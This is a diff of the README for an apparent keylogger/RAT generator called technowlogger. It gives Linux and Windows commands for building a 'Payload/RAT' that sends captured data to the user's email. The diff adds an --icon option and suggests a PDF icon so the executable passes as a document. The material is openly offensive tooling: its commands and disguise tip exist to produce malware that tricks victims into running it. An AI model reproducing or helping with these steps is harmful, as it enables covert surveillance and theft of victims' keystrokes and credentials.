@@ -69,17 +69,19 @@ $ cd /opt/
 # Clone this repository
 $ git clone https://github.com/Technowlogy-Pushpender/technowlogger.git
 
-# Go into the repository
+# Navigate to technowlogger folder
 $ cd technowlogger
 
 # Installing dependencies
 $ bash installer_linux.sh
 
-$ chmod +x paygen.py
+$ chmod +x technowgen.py
 $ ./technowgen.py  --help    or   python technowgen.py --help
 
 # Making Payload/RAT
-$ python technowgen.py -e youremail@gmail.com -p YourEmailPass -l -o output_file_name
+$ python technowgen.py -e youremail@gmail.com -p YourEmailPass -l -o output_file_name --icon icon_path
+
+Note: You can also use our custom icons from the icon folder, just use them like this  --icon icon/pdf.ico
 ```
 
 ## How To Use in Windows
@@ -102,7 +104,9 @@ $ python -m pip install -r requirements.txt
 $ python technowgen.py --help
 
 # Making Payload/RAT
-$ python technowgen.py -e youremail@gmail.com -p YourEmailPass -w -o output_file_name
+$ python technowgen.py -e youremail@gmail.com -p YourEmailPass -w -o output_file_name --icon icon_path
+
+Note: You can also use our custom icons from the icon folder, just use them like this  --icon icon/pdf.ico
 ```
 
 ## How to Update
